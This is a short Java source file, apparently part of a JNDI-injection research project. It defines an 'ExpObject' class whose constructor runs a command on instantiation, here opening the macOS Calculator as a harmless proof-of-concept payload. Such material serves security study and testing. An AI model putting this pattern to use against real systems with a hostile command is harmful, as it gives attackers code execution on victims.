package com.venscor.jdni;

import java.io.IOException;

/**
 * @author wangyu07 <wangyu07@kuaishou.com>
 * Created on 2022-02-07
 */
public class ExpObject {
    public ExpObject() {
        try {
            execExp();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private void execExp() throws IOException {
        System.out.println("start execute evil code...");
        Runtime.getRuntime().exec("open -a /System/Applications/Calculator.app");
    }

    public static void main(String[] args) {
        new ExpObject();
    }

}
